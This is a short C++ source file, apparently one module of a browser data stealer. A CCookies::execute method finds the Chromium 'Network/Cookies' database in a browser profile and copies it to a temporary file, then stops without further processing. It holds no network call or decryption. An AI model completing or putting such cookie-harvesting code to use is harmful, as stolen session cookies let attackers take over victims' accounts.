//
// Created by .1qxz on 09.06.2024.
//

#include "CCookies.h"

void CCookies::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Network" / "Cookies";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;
}
